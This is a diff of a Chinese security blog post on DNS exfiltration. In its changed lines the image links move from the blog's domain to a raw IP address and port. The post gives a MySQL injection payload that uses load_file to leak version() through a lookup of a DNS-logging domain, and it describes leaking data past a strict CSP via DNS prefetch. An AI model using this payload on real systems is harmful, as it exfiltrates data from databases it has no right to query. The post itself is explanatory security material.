@@ -13,12 +13,12 @@
 <meta property="og:site_name" content="Homaebic-Know thyself">
 <meta property="og:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/06/3169708276.jpg">
-<meta property="og:updated_time" content="2017-08-19T15:31:29.559Z">
+<meta property="og:image" content="http://120.25.80.195:7230/06/3169708276.jpg">
+<meta property="og:updated_time" content="2017-08-20T00:54:43.396Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用DNS通道传输一点数据">
 <meta name="twitter:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
-<meta name="twitter:image" content="http://hebic.me/usr/uploads/2017/06/3169708276.jpg">
+<meta name="twitter:image" content="http://120.25.80.195:7230/06/3169708276.jpg">
     
     
         
@@ -137,7 +137,7 @@
     <p>一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。</p>
 <h3 id="SQL中的DNS"><a href="#SQL中的DNS" class="headerlink" title="SQL中的DNS"></a>SQL中的DNS</h3><p>在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会记录下这个数据。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\\\\\'</span>,<span class="keyword">version</span>(),<span class="string">'.ikyzvu.ceye.io'</span>));</div></pre></td></tr></table></figure></p>
 <p>查询DNS记录就可以看到需要的数据。不过使用DNS信道带出数据在SQL注入中比较少，毕竟load_file不可以随便就使用的。</p>
-<p><img src="http://hebic.me/usr/uploads/2017/06/3169708276.jpg" alt="QQ截图20170609091548.jpg"></p>
+<p><img src="http://120.25.80.195:7230/06/3169708276.jpg" alt="QQ截图20170609091548.jpg"></p>
 <h3 id="XSS中的DNS"><a href="#XSS中的DNS" class="headerlink" title="XSS中的DNS"></a>XSS中的DNS</h3><p>在XSS的防御机制中有一个叫做CSP的东西，这个东西是一个维护人员可以自定义的白名单，以限制脚本和各种外部资源的加载。</p>
 <p>一个网站的CSP设置非常的凶悍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;self&apos;</div></pre></td></tr></table></figure></p>
 <p>看起来他只允许内部的脚本执行。<b>但是CSP的开发初衷是预防XSS漏洞，而没有考虑到信息泄露的问题。</b>因此使用DNS通道将获得的信息传递出来就显得很bug，DNS预读取可以做到这个。将需要的信息与域名结合起来使用DNS通道传输出来。需要注意的是火狐浏览器的X-DNS-Prefetch-Control头可以阻止DNS预读取传递信息。</p>
